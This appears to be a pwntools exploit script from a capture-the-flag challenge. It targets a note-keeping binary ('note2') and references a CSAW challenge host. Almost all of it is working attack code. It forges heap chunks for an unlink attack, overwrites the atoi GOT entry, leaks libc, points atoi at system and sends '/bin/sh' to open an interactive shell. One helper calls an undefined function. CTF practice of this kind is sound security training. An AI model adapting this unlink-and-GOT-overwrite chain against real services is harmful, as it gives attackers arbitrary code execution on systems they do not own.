#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#/proc/sys/kernel/randomize_va_space
from pwn import *
import time

#context.arch = 'amd64'
DEBUG = True
if DEBUG:
	io = process("./note2")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./note2")
else:
	io = remote("pwn.chal.csaw.io","9001")

def Add(size,content):
	#1:time.sleep(0.2)
	io.sendlineafter(">>\n","1")
	io.sendlineafter("(less than 128)\n",str(size))
	io.sendlineafter("content:\n",content)
	io.recvline()

def edit(index,content,overwrite):
	io.sendlineafter(">>\n","3")
	io.sendlineafter("note:\n",str(index))
	if overwrite:
		io.sendlineafter("2.append]\n","1")
	else:
		io.sendlineafter("2.append]\n","2")
	io.sendline(content)
	io.recvline()

def show(index):
	io.sendlineafter(">>\n","2")
	io.sendlineafter("note:",str(index))
	io.recvline()
	return io.recvline()
	
def free(index):
	io.sendlineafter(">>\n","4")
	io.sendlineafter("note:\n",str(index))
	io.recvline()

def leak_heap():
	alloc(0,"a"*8)
	alloc(1,"b"*8)
	free(1)
	free(0)
	#free(0)
	#alloc(2,"c"*8)
	#alloc(3,"d"*8)
	heap_addr = u64(show(0)[:4].ljust(8,"\x00"))
	heap_base = heap_addr - 0x30
	log.success("heap_base:"+hex(heap_base))
	return heap_base

def unlink_attack():
	global_pool = 0x0000000000602120
	payload = p64(global_pool-0x18) + p64(global_pool-0x10)
	Add(0x80,p64(0)+p64(0xa1)+payload)
	Add(0x0,"b"*8)
	Add(0x80,"c"*8)
	#free(0)
	payload = p64(0xa0) + p64(0x90)
	free(1)
	Add(0x0,"c"*0x10+payload)
	#edit(1,"d"*0x18+payload,False)
	#edit(1,"d"+payload,False)
	free(2)
	#Add(0x0,"d"*0x20)
	free_got = elf.got["free"]
	atoi_got = elf.got["atoi"]
	puts_got = elf.got["puts"]
	payload = "d"*0x18 + p64(atoi_got)# + "e"*0x8 + p64(puts_got) + p64(atoi_got)
	edit(0,payload,True)
	#edit(0,p64(puts_got),True)
	atoi_addr = u64(show(0).strip("\n")[-6:] + "\x00\x00")
	log.success("atoi_addr:"+hex(atoi_addr))
	libc.address = atoi_addr - libc.symbols["atoi"]
	system_addr = libc.symbols["system"]
	edit(0,p64(system_addr),True)
	log.success("system_addr:"+hex(system_addr))
	io.sendlineafter(">>\n","/bin/sh")
	#io.sendlineafter("note:\n","/bin/sh")
	#edit()
		
context.log_level = "debug"
#io = process("./doubletrouble")
io.sendlineafter("name:\n","junkjunk")
io.sendlineafter("address:\n","junkjunk")
#gdb.attach(io,"b *0x0000000000400B0E")
unlink_attack()
io.interactive()
	
